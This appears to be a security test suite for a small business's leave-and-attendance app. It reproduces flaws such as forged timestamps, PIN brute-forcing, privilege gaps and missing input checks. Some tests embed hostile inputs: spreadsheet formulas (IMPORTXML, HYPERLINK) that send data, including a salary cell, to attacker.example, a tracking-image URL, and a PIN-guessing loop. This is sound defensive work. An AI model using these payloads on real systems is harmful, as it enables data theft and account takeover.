// Round 2 - PRIVACY AND SECURITY reproducers for GJ Leave & Attendance.
// Every test asserts the SECURE behaviour, so every test FAILS on the current code.
// Run: node --test /home/claude/findings/repro-round2.test.js
const test = require('node:test');
const assert = require('node:assert/strict');
const ROOT = __dirname + '/..';
const Store = require(ROOT + '/src/server/store.js');
const Api = require(ROOT + '/src/server/api.js');
const { env, seed } = require(ROOT + '/test/helpers.js');

// A fake Sheet: every cell is text (same as test/store-api.test.js).
function fakeGrid() {
  const tabs = {};
  return {
    tabs,
    tabNames: () => Object.keys(tabs),
    addTab: name => { tabs[name] = []; },
    read: name => (tabs[name] || []).map(r => r.slice()),
    append: (name, row) => { tabs[name].push(row.map(String)); },
    writeRow: (name, i, row) => { tabs[name][i] = row.map(String); },
    headers: name => (tabs[name] && tabs[name][0] || []).slice(),
    tail: (name, n) => tabs[name].slice(1).slice(-n).map(r => r.slice()),
    appendRows: (name, rows) => { const first = tabs[name].length; rows.forEach(r => tabs[name].push(r.map(String))); return first; },
  };
}
function sheetWorld() {
  const g = fakeGrid(); Store.setup(g);
  const mem = seed();
  const db0 = Store.open(g);
  mem.db.rows('People').forEach(p => db0.insert('People', p));
  const ctx = (date, hhmm) => ({ db: Store.open(g), env, now: mem.ist(date, hhmm) });
  return { g, ctx, ist: mem.ist };
}
// World with the owner bootstrapped and Neha, Vikas, Aakash signed in on approved phones.
function apiWorld() {
  const w = sheetWorld();
  const call = (when, action, who, args) => Api.handle(w.ctx(...when), { action, clientVersion: 1, args, ...(who || {}) });
  const t = ['2026-11-20', '10:00'];
  w.ctx(...t).db.update('People', 'varun', { pinSalt: 's', pinHash: env.sha256('s:9999') });
  const first = call(t, 'login', null, { personId: 'varun', pin: '9999' }).data;
  const varun = { personId: 'varun', deviceToken: first.deviceToken, deviceId: first.deviceId };
  const signIn = (id, pin) => {
    call(t, 'setPin', varun, { personId: id, pin });
    const r = call(t, 'login', null, { personId: id, pin }).data;
    call(t, 'decideDevice', varun, { id: r.deviceId, approve: true });
    return { personId: id, deviceToken: r.deviceToken, deviceId: r.deviceId };
  };
  return { w, call, t, varun, neha: signIn('neha', '1111'), vikas: signIn('vikas', '2222'), aakash: signIn('aakash', '3333') };
}
const who = s => ({ personId: s.personId, deviceToken: s.deviceToken });
const leave = (dates, extra) => ({ kind: 'full', dates, reasonCode: 'Personal work', reasonText: 'Bank work', ...extra });
const rowsOf = (a, tab) => a.w.ctx(...a.t).db.rows(tab);
const PIC = { photo: 'data:image/jpeg;base64,FULL', thumb: 'data:image/jpeg;base64,THUMB' };

// ---------------------------------------------------------------- F1 (Critical)
test('F1 submittedAt from the phone must be ignored: a same-day leave sent after duty start is Unannounced, never auto-approved', () => {
  const a = apiWorld();
  // Neha (duty 09:30) applies at 12:00 for TODAY. Honest result: Unannounced -> goes to Aakash, 1 violation when granted.
  const when = ['2026-11-24', '12:00'];
  const honest = a.call(when, 'previewLeave', who(a.neha), leave(['2026-11-24']));
  assert.equal(honest.data.type, 'Unannounced');           // sanity: this passes
  assert.equal(honest.data.decision, 'aakash');             // sanity: this passes
  // Attack: add one extra field to the same request.
  const forged = a.call(when, 'submitLeave', who(a.neha), leave(['2026-11-24'], { submittedAt: 1 }));
  assert.notEqual(forged.data && forged.data.status, 'Approved', 'a crafted submittedAt got an unannounced leave auto-approved');
  const row = rowsOf(a, 'LeaveRequests')[0];
  assert.equal(row.type, 'Unannounced', 'the server stored type ' + row.type + ' from a client-supplied time');
});

test('F1b editLeave has the same hole: an edit with a forged submittedAt wipes the violation and re-approves as Regular', () => {
  const a = apiWorld();
  // 08:00, duty at 09:30 = 1.5 h notice = Unannounced. Aakash approves -> 1 violation.
  const r = a.call(['2026-11-24', '08:00'], 'submitLeave', who(a.neha), leave(['2026-11-24']));
  a.call(['2026-11-24', '08:05'], 'decideLeave', who(a.aakash), { id: r.data.id, approve: true });
  const live = () => rowsOf(a, 'Violations').filter(v => v.personId === 'neha' && v.disputeState !== 'removed').length;
  assert.equal(live(), 1);                                  // sanity
  a.call(['2026-11-24', '08:10'], 'editLeave', who(a.neha), { id: r.data.id, ...leave(['2026-11-24']), submittedAt: 1 });
  // An edit is decided again from scratch, so the old violation is withdrawn with the old version.
  // What must hold: the forged time changes nothing. The edit is still Unannounced, it is never
  // approved by the system, and the violation is back the moment Aakash approves it.
  const row = rowsOf(a, 'LeaveRequests')[0];
  assert.equal(row.type, 'Unannounced', 'the forged time turned the edit into ' + row.type);
  assert.equal(row.status, 'Pending with Aakash');
  a.call(['2026-11-24', '08:15'], 'decideLeave', who(a.aakash), { id: r.data.id, approve: true });
  assert.equal(live(), 1, 'the violation did not come back with the approval');
});

// ---------------------------------------------------------------- F2 (High, conditional)
test('F2 bootstrap + PIN guessing: before the owner’s first sign-in, an internet caller must not be able to become the owner with only PIN guesses', () => {
  const w = sheetWorld();
  // Release state: owner PIN exists (4 digits, like the app generates), no phone bound yet.
  w.ctx('2026-11-20', '10:00').db.update('People', 'varun', { pinSalt: 's', pinHash: env.sha256('s:2468') });
  w.ctx('2026-11-20', '10:00').db.insert('PayInfo', { personId: 'neha', fixedSalary: 17000, targetAllowance: 2000, disciplineBonus: 500, dutyHours: 9 });
  const post = (ms, action, args, id) => Api.handle({ db: Store.open(w.g), env, now: ms }, { action, clientVersion: 1, args, ...(id || {}) });
  // The attacker knows nothing except the public URL. "names" gives the ids.
  const ownerId = post(w.ist('2026-11-20', '10:00'), 'names').data.filter(p => p.name === 'Varun')[0].id;
  let now = w.ist('2026-11-20', '10:00'), session = null, days = 0;
  for (let pin = 1000; pin <= 9999 && !session; ) {
    for (let i = 0; i < 5 && pin <= 9999 && !session; i++, pin++) {         // 5 guesses, then the 15-minute lock
      const r = post(now, 'login', { personId: ownerId, pin: String(pin) });
      if (r.ok && r.data.ok) session = { personId: ownerId, deviceToken: r.data.deviceToken };
    }
    now += 15 * 60000 + 1000;
    days = (now - w.ist('2026-11-20', '10:00')) / 86400000;
    if (days > 30) break;
  }
  const loot = session ? post(now, 'getSettings', {}, session) : null;
  assert.equal(session, null, 'attacker became the owner after ' + days.toFixed(1) + ' days of guessing; salary read: ' +
    (loot && loot.ok ? JSON.stringify(loot.data.people.filter(p => p.pay)[0].pay) : 'n/a'));
});

test('F2b PIN lock never escalates: after hours of non-stop wrong PINs the server must not still check 5 fresh guesses every 15 minutes', () => {
  const a = apiWorld();
  let now = a.w.ist('2026-11-20', '10:00'), accepted = 0;
  for (let round = 0; round < 40; round++) {                                 // 40 lock periods = 10 hours
    for (let i = 0; i < 5; i++) {
      const r = Api.handle({ db: Store.open(a.w.g), env, now }, { action: 'login', clientVersion: 1, args: { personId: 'neha', pin: '0000' } });
      if (r.code === 'LOGIN') accepted += 1;                                 // a guess the server actually checked
    }
    now += 15 * 60000 + 1000;
  }
  assert.ok(accepted <= 50, accepted + ' PIN guesses were checked in 10 hours for one account (= 480 a day; a 4-digit PIN falls in under 19 days)');
});

// ---------------------------------------------------------------- F3 (High)
test('F3 only Varun overrides a hard rule: Aakash must not be able to switch off a "no leave" restriction that Varun created', () => {
  const a = apiWorld();
  const id = a.call(a.t, 'saveRestriction', who(a.varun), { from: '2026-12-01', to: '2026-12-10', note: 'Peak sales season', rule: 'no-leave' }).data.id;
  assert.equal(a.call(a.t, 'previewLeave', who(a.neha), leave(['2026-12-03'])).data.decision, 'blocked'); // sanity
  const off = a.call(a.t, 'saveRestriction', who(a.aakash), { id, from: '2026-12-01', to: '2026-12-10', note: 'Peak sales season', rule: 'no-leave', on: false });
  const after = a.call(a.t, 'submitLeave', who(a.neha), leave(['2026-12-03']));
  assert.equal(off.code, 'FORBIDDEN', 'the manager switched the owner’s restriction off; Neha’s leave is now: ' + (after.data && after.data.status));
});

test('F3b Settings are Varun-only: once the shop point is set, Aakash must not be able to move it', () => {
  const a = apiWorld();
  a.call(a.t, 'setShopPoint', who(a.varun), { samples: [1, 2, 3].map(() => ({ lat: 29.15, lng: 75.72 })) });
  const r = a.call(a.t, 'setShopPoint', who(a.aakash), { samples: [1, 2, 3].map(() => ({ lat: 28.61, lng: 77.2 })) });
  const now = JSON.parse(rowsOf(a, 'Settings').filter(x => x.key === 'shopPoint')[0].value);
  assert.equal(r.code, 'FORBIDDEN', 'the manager moved the shop point to ' + now.lat + ', ' + now.lng);
});

// ---------------------------------------------------------------- F4 (Medium)
test('F4 lost or stolen phone: the owner must be able to revoke an approved phone', () => {
  const a = apiWorld();
  assert.equal(a.call(a.t, 'me', who(a.neha)).ok, true);
  const r = a.call(a.t, 'decideDevice', who(a.varun), { id: a.neha.deviceId, approve: false });
  a.call(a.t, 'setPin', who(a.varun), { personId: 'neha', pin: '8888' });    // a PIN reset does not help either
  assert.equal(a.call(a.t, 'me', who(a.neha)).code, 'AUTH', 'revoke answered ' + r.code + '; the old phone still works after the PIN reset');
});

// ---------------------------------------------------------------- F5 (Medium)
test('F5 phone-request flooding: repeated logins must not create an unlimited number of pending phone requests and owner alerts', () => {
  const a = apiWorld();
  for (let i = 0; i < 25; i++) a.call(a.t, 'login', null, { personId: 'neha', pin: '1111', deviceLabel: 'Varun new iPhone - please approve' });
  const pending = rowsOf(a, 'Devices').filter(d => d.personId === 'neha' && d.status === 'pending').length;
  assert.ok(pending <= 3, pending + ' pending phone requests for one person, each with its own alert to the owner');
});

// ---------------------------------------------------------------- F6 (Medium)
test('F6 text sizes are checked only in the phone: the server must refuse a reason far larger than one Sheet cell (50,000 characters)', () => {
  const a = apiWorld();
  const r = a.call(['2026-11-20', '10:00'], 'submitLeave', who(a.neha), leave(['2026-11-27'], { reasonText: 'x'.repeat(60000) }));
  assert.equal(r.ok, false, 'a 60,000-character reason was accepted; on the real Sheet the write fails after the request was already validated');
});

test('F6b the sign-in screen needs no account: an unbounded phone label must be refused too', () => {
  const a = apiWorld();
  a.call(a.t, 'login', null, { personId: 'neha', pin: '1111', deviceLabel: 'L'.repeat(60000) });
  const longest = Math.max(...rowsOf(a, 'Devices').map(d => String(d.label).length));
  assert.ok(longest <= 200, 'stored a phone label of ' + longest + ' characters');
});

// ---------------------------------------------------------------- F7 (Medium)
test('F7 check-in thumbnail must be a JPEG data URL: a staff member must not plant a remote URL that every viewer’s phone will load', () => {
  const a = apiWorld();
  const r = a.call(a.t, 'checkIn', who(a.neha), { photo: PIC.photo, thumb: 'https://attacker.example/track.gif?who=viewer' });
  const served = a.call(a.t, 'todayAtGJ', who(a.varun)).data.map(x => a.call(a.t, 'photo', who(a.varun), { id: x.photoId }).data.data);
  assert.equal(r.ok, false, 'accepted; the owner’s phone is told to load: ' + served[0]);
});

// ---------------------------------------------------------------- F8 (Medium)
test('F8 location flag: a check-in with a non-numeric location must be flagged, not pass as "inside the shop"', () => {
  const a = apiWorld();
  a.call(a.t, 'setShopPoint', who(a.varun), { samples: [1, 2, 3].map(() => ({ lat: 29.15, lng: 75.72 })) });
  assert.equal(a.call(a.t, 'checkIn', who(a.vikas), PIC).data.flag, 'no-location');                     // sanity: honest "no GPS" is flagged
  const r = a.call(a.t, 'checkIn', who(a.neha), { ...PIC, lat: 'x', lng: 'x' });
  assert.notEqual(r.data.flag, '', 'lat "x" gave no flag at all (distance ' + r.data.distance + ')');
});

// ---------------------------------------------------------------- F9 (Medium)
test('F9 requestShort: the date must be a real YYYY-MM-DD; free text must not reach the Sheet', () => {
  const a = apiWorld();
  const r = a.call(['2026-11-20', '08:00'], 'requestShort', who(a.neha), { kind: 'late', date: '=IMPORTXML("https://attacker.example/"&A1,"//a")', time: '10:00' });
  const cells = a.w.g.tabs.ShortRequests.slice(1).map(row => row[2]);
  assert.equal(r.ok, false, 'accepted; ShortRequests.date now holds: ' + cells[0]);
});

test('F9b formula text: a value starting with = + - @ must be neutralised before it is written to a cell', () => {
  const a = apiWorld();
  a.call(['2026-11-20', '10:00'], 'submitLeave', who(a.neha), leave(['2026-11-27'], { reasonText: '=HYPERLINK("https://attacker.example/?d="&PayInfo!B2,"Sick")' }));
  const col = a.w.g.tabs.LeaveRequests[0].indexOf('reasonText');
  const cell = a.w.g.tabs.LeaveRequests[1][col];
  assert.equal(/^[=+\-@]/.test(cell), false, 'raw formula text handed to setValues: ' + cell);
});

// ---------------------------------------------------------------- F10 (Low)
test('F10 dispatcher: inherited object keys must not be callable actions (unauthenticated "constructor" returns ok)', () => {
  const a = apiWorld();
  const r = a.call(a.t, 'constructor', null, {});
  assert.equal(r.code, 'UNKNOWN', 'action "constructor" answered ' + JSON.stringify(r).slice(0, 80));
});

// ---------------------------------------------------------------- F11 (Low)
test('F11 alert flooding: "Remind Aakash" must be rate-limited', () => {
  const a = apiWorld();
  a.call(['2026-11-20', '10:00'], 'checkIn', who(a.neha), PIC);
  const o = a.call(['2026-11-20', '11:00'], 'goingOut', who(a.neha), { reason: 'Bank', expectedMinutes: 20 }).data;
  a.call(['2026-11-20', '11:01'], 'decideOuting', who(a.aakash), { id: o.id, approve: true });
  a.call(['2026-11-20', '11:20'], 'imBack', who(a.neha), { id: o.id });
  const count = () => rowsOf(a, 'Notifications').filter(n => n.to === 'aakash' && /^Reminder: confirm/.test(n.title)).length;
  for (let i = 0; i < 40; i++) a.call(['2026-11-20', '11:21'], 'remindBack', who(a.neha), { id: o.id });
  assert.ok(count() <= 3, count() + ' reminders (and alert emails) sent to Aakash inside one minute');
});

// ---------------------------------------------------------------- F12 (Low)
test('F12 dates must be real calendar dates: "2026-11-31" is not a day', () => {
  const a = apiWorld();
  const r = a.call(['2026-11-20', '10:00'], 'submitLeave', who(a.neha), leave(['2026-11-31']));
  assert.equal(r.ok, false, 'accepted with status ' + (r.data && r.data.status));
});

// ---------------------------------------------------------------- F13 (Low)
test('F13 the last owner must not be able to lock everybody out by making the only owner inactive', () => {
  const a = apiWorld();
  const me = a.call(a.t, 'getSettings', who(a.varun)).data.people.filter(p => p.id === 'varun')[0];
  const r = a.call(a.t, 'savePerson', who(a.varun), { ...me, active: false });
  assert.equal(r.ok, false, 'saved; the owner can now sign in: ' + a.call(a.t, 'me', who(a.varun)).ok);
});

// ---------------------------------------------------------------- F14 (Medium, phone app)
test('F14 phone app: "Sign out" must forget the phone token (today a reload signs the person back in with no PIN)', async () => {
  const fs = require('node:fs'), vm = require('node:vm');
  const made = [];
  const el = tag => {
    const e = { tag, kids: [], handlers: {}, attrs: {}, options: [], style: {}, hidden: false, textContent: '', value: '', className: '',
      appendChild(c) { this.kids.push(c); return c; }, replaceChildren(...c) { this.kids = c; }, replaceWith() {},
      addEventListener(k, fn) { this.handlers[k] = fn; }, setAttribute(k, v) { this.attrs[k] = v; } };
    made.push(e); return e;
  };
  const store = { 'gjleave.session': JSON.stringify({ personId: 'neha', deviceToken: 'TOKEN-ON-THIS-PHONE' }) };
  const replies = { me: { id: 'neha', name: 'Neha', role: 'staff', group: 'Sales', dutyStart: '09:30', dutyEnd: '18:30', reasons: [], serverTime: Date.now() },
    today: { date: '2026-11-20', hints: [], checkIn: null, checkOut: null, outing: null, shorts: [] }, notifications: [], names: [] };
  const sandbox = { console, setTimeout, clearTimeout, Promise, JSON, Date, Object, Math, String, Number, Array, Error,
    document: { getElementById: () => el('div'), createElement: el, createTextNode: t => ({ text: t }), body: el('body') },
    localStorage: { getItem: k => (k in store ? store[k] : null), setItem: (k, v) => { store[k] = v; }, removeItem: k => { delete store[k]; } },
    location: { search: '', origin: 'https://x.github.io', pathname: '/gj-leave/', reload() {} }, navigator: { userAgent: 'test' }, scrollTo() {},
    fetch: (url, o) => Promise.resolve({ json: () => Promise.resolve({ ok: true, data: replies[JSON.parse(o.body).action] }) }) };
  sandbox.window = sandbox; sandbox.GJ_CONFIG = { API_URL: 'https://server.example/exec', CLIENT_VERSION: 1 };
  vm.runInNewContext(fs.readFileSync(ROOT + '/docs/app.js', 'utf8'), sandbox);
  await new Promise(r => setTimeout(r, 30));
  assert.equal(sandbox.GJApp.state.me.name, 'Neha');                         // sanity: the stored token signed her in with no PIN
  sandbox.GJApp.VIEWS.more();
  const btn = made.filter(e => e.tag === 'button' && e.kids.some(k => k.text === 'Sign out'))[0];
  btn.handlers.click();
  await new Promise(r => setTimeout(r, 30));
  const left = JSON.parse(store['gjleave.session'] || '{}');
  assert.equal(left.deviceToken, undefined, 'after Sign out the phone still stores the token: ' + left.deviceToken);
});
